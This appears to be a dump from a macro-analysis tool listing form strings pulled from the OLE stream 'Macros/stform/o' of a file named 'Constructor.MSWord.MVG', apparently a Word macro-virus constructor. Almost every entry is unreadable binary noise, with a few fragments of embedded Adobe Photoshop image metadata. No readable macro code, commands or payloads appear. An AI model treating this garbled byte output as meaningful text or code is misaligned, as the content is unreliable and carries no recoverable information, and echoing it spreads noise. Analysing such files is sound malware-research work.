- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ĺ�sݧ��0�c|G��5�C(��1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���I��:��k�s������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'/'-�~M�ױ���ڝ��-.���!$��];3��Ĩq.��$�I%I$�J���!]�Hi#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�W�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B|85���N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H��Kk��2L|ԛ}��w�2x�/Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=�u`��ﯦ5���uZ-�[����^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r.1�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$κ�D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��ݺ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R-t��;Mӧ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l���1�&~i�E��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xb$g}j8�z��c����:"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q� ���jA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)����pq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~���n�W�lN�G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"CI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 h����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�E�@t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~D��|����#Da��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�<Խ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�qN۬h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ɽ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$ 9�9?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��w�TQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EÇG}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��C&L�JnOj��g��#�p����I%)$�IJI$�R�I$���I%)$�IJI$�R�I$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8BIM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'File written by Adobe Photoshop� 4.0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Adobe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Rb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r���#3CT�����U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�c���$4D%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1BRAQbr�����#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a���3S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q���C��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�c��$4����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�=$a�Cֈ7�]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gH4@�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A���e���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L3���;��`ܦ�n7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�ɪ��55
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K����q\~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~VǏ���p��8$�d�Z?2�9��k{ڑ���kKţX��5��񹜎\11+v]?̗�R~ȢL�����=��7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ki]�l�#5��J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5*�qj^�T_��i��W-wU/;�~6M��_Ou���~NEx����UA7)JOD�^�[�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3:D9"&gHl���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^_%Mu�1�8F{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O5�ȝ)?�G��;�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�ۭ���I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y)�5�턋<��J�o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�˷ܛ|VFOc�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g��;[�5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�)z�x��:�bg�oѵ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:y6c��θ�9j��|4�v~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{ɢ�)���[�]Ս,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i�\��D�{<t�]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�1qgKŧ�i�V�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6K.tY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���R��/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_6şM��}����/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ͮ9�;f�����n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>�̢���酑R^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/���:w���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŵ.��'v>��o�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�2���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YY+.Q��Nk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3q�����)�ܙ��&(�mO��Z77�d����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*��	})�E�x��r�JE�&"�Ң��F��%n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}/>�#���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�cq�ɶ97ǣ�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�G�;��/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���7^i[R�xS^���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mq����ɣ������_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T���ӛ�2�ׅQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��yΧ#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���a���~��p�`�ڵ�m�Z?/���̌K����\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ն�$�G����}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʻ��&���ƳjW�ٷ��	�v?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�椧��mǭh�[_�Խ��Y�?���9���ܽ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�^ܓ�l��Yc��)��/�.��L��Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��zaƺ�	i8i���ɸէ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^=)_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������\���>����ZO?��\(UY*�]�-�^��{�n��t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gu�T7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ٷ��~��3�ڷ�O4���캯�Ͼ-��$���m��x�\b��iAȼc���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7gar�6ng�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�]M�ؼnR�ۯH��l�ޗ����<g�y��^��cɺ<Y��Z�8Ӓ}��)>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��NS����fd��ҹ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vd��lt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���q�:����M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Uً��^�>X�Ƕ9���}{w��_�?n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Waw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#bͮQ��_8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ME�l<�m�8��^>fL�lX����[�JNNK∊�'Ζ����w,�+�5�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�y7J�'�IA�ŗ��=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӤL��J�V��{�bַ�`�5���s�ո-_�e�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bk��D���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q܇
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ul,��,�Y�')(�!�z��/i�J䜶��;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ÆkkZg��U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[(.��I6��N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;S۬������[�3����'l_�7�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i(�팢ۛ�梷nӤ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�RG��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1E��t��-���^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a�D��������Զ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y��9\5�R�5	�c�X⟊���ۯ�rb�ne'�������K��6^�Rm�O��p{����y�v�ú99YV_�(���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TVٶ����de��K+�nI��>��ZE/�w~��e�mM���������َ�9m��H�:�x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/.�۬x|NJb�맺�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ܗ� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<z�F�g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�['dw�k�<�^f^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[LU
-------------------------------------------------------------------------------
